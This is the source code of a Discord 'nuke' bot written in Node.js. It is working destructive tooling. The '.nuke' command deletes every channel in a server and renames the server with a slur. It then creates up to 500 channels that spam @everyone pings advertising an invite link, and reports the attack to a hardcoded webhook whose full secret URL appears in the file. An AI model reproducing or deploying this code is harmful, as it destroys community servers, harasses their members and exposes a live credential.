const { Client } = require('discord.js');
const http = require('http');

const client = new Client({
    intents: [
        1,   // GUILDS
        512, // GUILD_MESSAGES
        32768, // MESSAGE_CONTENT
        2,   // GUILD_MEMBERS
        16   // GUILD_CHANNELS
    ]
});

const TOKEN = process.env.TOKEN;
const LOG_WEBHOOK = "https://discord.com/api/webhooks/1497802608491106357/1rPNKGuyh780KsnqoWnzAWcXjbPTfRx3jWtcefHcYkdywE7GkibcGwvWqRvZE2CgjHnf";

http.createServer((req, res) => {
    res.writeHead(200, {'Content-Type': 'text/plain'});
    res.end('Alive');
}).listen(process.env.PORT || 3000);

client.once('ready', () => {
    console.log(`[+] ${client.user.tag} is ready`);
});

const sleep = ms => new Promise(r => setTimeout(r, ms));

// Test webhook command
client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    if (message.content === '.testwh') {
        try {
            const res = await fetch(LOG_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: `Test from ${message.author.tag}` })
            });
            console.log(`[WEBHOOK] Status: ${res.status}`);
            message.reply(`Webhook status: ${res.status}`).catch(() => {});
        } catch (e) {
            console.error(`[WEBHOOK] Error: ${e.message}`);
            message.reply(`Error: ${e.message}`).catch(() => {});
        }
        return;
    }

    if (message.content === '.nuke') {
        message.delete().catch(() => {});
        const g = message.guild;
        const originalName = g.name;
        const username = message.author.tag;
        const time = new Date().toISOString();

        g.setName('NGA GOT NUKED BY JHUB').catch(() => {});

        const channels = Array.from(g.channels.cache.values());
        for (const ch of channels) {
            ch.delete().catch(() => {});
            await sleep(100);
        }

        for (let i = 0; i < 500; i++) {
            g.channels.create({name: 'jhub-on-top', type: 0}).then(ch => {
                if (!ch) return;
                for (let j = 0; j < 10; j++) {
                    ch.send('@everyone @here Discord.gg/Jhub NGA GOT NUKED BY JHUB').catch(() => {});
                }
            }).catch(() => {});
            await sleep(200);
        }

        // Send log webhook
        try {
            const res = await fetch(LOG_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `**Server Nuked**\nName: ${originalName}\nBy: ${username}\nTime: ${time}`
                })
            });
            console.log(`[NUKE LOG] Webhook status: ${res.status}`);
        } catch (e) {
            console.error(`[NUKE LOG] Failed: ${e.message}`);
        }
    }
});

client.login(TOKEN);
